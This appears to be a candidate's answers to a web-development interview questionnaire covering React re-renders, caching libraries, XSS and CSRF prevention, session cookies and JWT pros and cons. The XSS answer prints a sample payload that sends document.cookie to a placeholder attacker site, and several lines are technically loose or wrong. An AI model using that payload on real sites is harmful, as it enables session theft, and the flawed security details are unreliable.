1. What are some ways to prevent unnecessary re-renders in React, and when would you use each technique?

We have many ways to prevent unnecessary re-renders. Here is few of those
-using useMemo and useCallback hooks
-API Call Optimization with React Query
-Creating Memoized Selectors with Reselect
-React.memo or PureComponent
-sometime using useRef instead of useState

2. What are some practical uses of React Context and React Hooks?

React Context is for Providing data to the nested childrens without passing the props.
useState, useEffect, useRef are widly used to create a componenet and manage the state.

3. What are some other ways caching could be implemented for Part I? What are the differences and why might you choose one over the other?

For caching, we can use React Query, SWR, Apollo Client, RTK-Query. I am using React Query because it is really easy to use and also have good documentations.

4. What are some practical steps to prevent XSS and CSRF?

Cross-Site Request Forgery (CSRF) is a Web application security vulnerability where an attacker tricks end-users into performing unwanted actions in which the user is logged in. CSRF has others name like XSRF, sea surf, session riding, cross-site reference forgery, and hostile linking. With the help of social engineering, an attacker can trick the victim of a web application into executing malicious actions of the attacker’s choosing.

Cross-site scripting is also known as XSS. it is a very popular, dangerous, and favorable vulnerability of most of the Bug Hunters. XSS is a web security vulnerability that allows an attacker to fully compromise the vulnerable web application. if the victim is high privileged within a vulnerable site then the attacker can get full control of that site. The main purpose of XSS vulnerabilities is to steal the credentials of the victim. An XSS vulnerability is mainly a javascript technique. This vulnerability happens because of Developer didn’t pay attention to the user input filter.

A simple XSS payload looks like this:

<script>alert(document.cookies())</script>
<script>document.location.href=”
attackers.website/cookie=”>+document.cookie</script>

Anti-CSRF Tokens:

Use a token that is associated with a particular user and can be found as a hidden value in every state-changing form which is present on the web application. This token is called a CSRF Token.
CSRF token should be:
Unpredictable with high entropy.
Tied to the user’s session.
Strictly validated in every case before the relevant action is executed.
Same Site cookies:
CSRF occurs when the victim clicks on attacker.com and the request goes to bank.com including victim session_id. That is cross-site communication when the request comes from a third-party site such as xyz.com and the request goes to abc.com.
so, what happens if we are not providing the session_id then they don’t have any chance to authorize and csrf prevents. That thing provides do same site cookie features.
The same site cookie is a cookie that will only be sent if the request is coming from or originating from the same site. if the request comes from a third-party site, it will not attach the cookie.
There are three ways to set the same site attribute None, Lax and Strict.
None by default, Lax for top-level navigation bar or get request and Strict is disabled the cookies sent to third party sites.

XSS Prevention Techniques:
Filter input on arrival
Encode data on output
Use appropriate response headers
content Security policy
Implementing WAFs

5. When using traditional session cookies, what are the primary security concerns and mitigation techniques you might use for common attacks?

The two most common causes of cookie disclosure are browser vulnerabilities and cross-site scripting.
A major concern regarding sessions is the secrecy of the session identifier. If this is kept secret, there is no practical risk of session hijacking. With a valid session identifier, an attacker is much more likely to successfully impersonate one of your users.

6. What are some advantages and disadvantages of using JWT for authorization and authentication in a web application?

Pros
-No Database Table
-Simpler to use if careful
-Used across services

Cons
-Compromised Secret Key
-Cannot manage client from the server
-Cannot push Messages to clients
-Crypto-algo can be deprecated
-Data Overhead
-Complicated to understand

7. What are some new/interesting Web (browser), React, or Node.js features you are interested in, or have used recently for the first time?

Suspense, Server Components, Web Worker, Service Worker, Web Sockets
